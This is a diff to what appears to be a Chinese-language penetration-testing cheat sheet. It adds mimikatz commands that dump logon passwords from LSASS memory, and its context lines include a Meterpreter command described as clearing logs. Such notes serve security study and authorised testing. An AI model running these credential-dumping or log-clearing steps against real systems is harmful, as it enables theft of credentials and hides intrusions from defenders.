@@ -88,6 +88,17 @@ load                         #使用扩展库
 run				             #使用扩展库
 clearev                       #清除日志
 
+mimikatz
+```python
+##右键以管理员权限运行
+##获取调试权限
+privilege::debug
+#在具有Isass进程的权限才可以抓到密码
+##抓取密码
+sekurlsa::logonpasswords
+
+```
+
 参考链接
 [使用hashcat爆破各种hash | 若水斋](https://blog.werner.wiki/use-hashcat-crack-all-kinds-of-hash/)
 
